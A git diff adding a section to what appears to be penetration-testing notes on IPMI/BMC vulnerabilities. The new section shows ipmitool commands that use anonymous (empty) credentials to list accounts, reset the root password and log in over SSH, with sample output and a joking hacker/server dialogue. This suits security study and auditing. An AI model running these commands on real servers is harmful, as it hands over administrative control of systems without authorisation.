@@ -164,11 +164,41 @@ You heard that right - the BMC will tell you the password hash for any valid use
 Hacker: I want to login!
 Server: Yes, please say your account and password! But here are all my accounts and MD5/SHA1 hashed passwords!
 Hacker: Thanks I will bruteforce those hashes in a second and I will return with a valid username and password!
-Server: OK!
+Server: Ok!
 ```
 
-## IPMI Anonymous Authentication (B: yes)
-tbc
+## IPMI Anonymous Authentication (B: Yes)
+#### Exploiting with IPMITOOL
+```
+$ ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
+```
+ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
+
+1                    false  false      true      ADMINISTRATOR
+
+2  root            false  false      true      ADMINISTRATOR
+
+3  admin            true    true      true      ADMINISTRATOR
+```
+$ ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 password
+```
+At this point we can login to the BMC over SSH using the new password for the root user account.
+```
+$ ssh root@10.0.0.97
+root@10.0.0.97's password: password
+```
+>> SMASH-CLP Console v1.09 <<
+->
+#### How this works?
+
+```
+Hacker: I want to login!
+Server: Yes, please say your account and password! But here are all my accounts and MD5/SHA1 hashed passwords!
+Hacker: '','' (no account and no password)
+Server: Access granted!
+```
+Crazy enought?
+
 ## Supermicro IPMI UPnP Vulnerability (A: Is it going to end now?)
 tbc
 ## Supermicro IPMI Clear-text Passwords (B: No)
